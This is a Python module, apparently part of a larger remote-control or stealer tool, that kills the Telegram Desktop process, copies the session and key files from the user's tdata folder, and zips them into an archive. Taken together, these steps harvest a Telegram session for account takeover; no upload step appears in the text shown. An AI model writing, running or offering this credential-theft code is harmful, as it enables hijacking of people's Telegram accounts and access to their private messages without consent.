import os
import os.path
import shutil, psutil, time, glob
from datetime import time
from datetime import datetime
from zipfile import ZipFile
from utils.logs import logUser, logSystem, success, stopColor, logError, logInfo, logServer
from modules.other import show_current_datetime

def close_telegram():
    for process in psutil.process_iter():
        if process.name() == "Telegram.exe":
            process.kill()
            print(logServer+"telegram закрыт."+stopColor+show_current_datetime())

    
    print(logServer+"telegram не был запущен."+stopColor+show_current_datetime())

def TelegramGet():
    now = datetime.now()
    name_archive = str(now.strftime("%d_%m_%y_%I_%M"))

    pathusr = os.path.expanduser('~')
    tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
    tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
    hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'

    os.mkdir(tdata_path + '\\connection_hash')
    os.mkdir(tdata_path + '\\map')

    hash_map = glob.iglob(os.path.join(hash_path , "*"))
    for file in hash_map:
        if os.path.isfile(file):
            shutil.copy2(file, tdata_path + '\\map')

    files16 = glob.iglob(os.path.join(tdata_path , "??????????*"))
    for file in files16:
        if os.path.isfile(file):
            shutil.copy2(file, tdata_path + '\\connection_hash')

    with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip','w') as zipObj:
        for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\map'):
            for filename in filenames:
                filePath = os.path.join(folderName, filename)
                zipObj.write(filePath)

        for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\connection_hash'):
            for filename in filenames:
                filePath = os.path.join(folderName, filename)
                zipObj.write(filePath)

    shutil.rmtree(tdata_path + '\\connection_hash')
    shutil.rmtree(tdata_path + '\\map')

    old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
    new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' , name_archive + ".zip")
    return old_file